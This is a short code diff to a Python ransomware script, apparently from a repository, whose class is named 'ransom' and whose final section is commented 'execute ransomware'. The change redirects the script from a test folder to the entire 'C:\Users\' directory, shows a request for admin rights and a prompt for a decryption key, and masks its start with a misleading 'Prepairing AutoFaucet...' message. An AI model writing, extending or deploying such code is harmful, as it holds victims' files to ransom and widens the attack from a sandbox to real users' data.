@@ -20,14 +20,13 @@ class ransom:
 
     def read_directory(self,view_path):
         self.force_admin_rights()
-
+        inputKey = ""
         for path, subdirs, files in os.walk(view_path):
             for name in files:
                 filePath = os.path.join(path, name)       # FULL File PATH
                 content = self.read_file(filePath)        # File Content (FROM FILE) 
                 
                 if self.verify_token(content.decode("latin-1")):
-                    inputKey = ""
                     while inputKey != self.privKey: 
                         if inputKey!=self.privKey:
                             inputKey = input("Decryption KEY: ")
@@ -141,6 +140,6 @@ The decryption tool + private decryption key will allow you to decrypt any file 
 #execute ransomware
 print("Prepairing AutoFaucet...")
 try:
-    ransom().read_directory("C:\\Users\\Game\\AppData\\Roaming\\TestRansom\\")
+    ransom().read_directory("C:\\Users\\")
 except Exception as e:
     print(str(e))
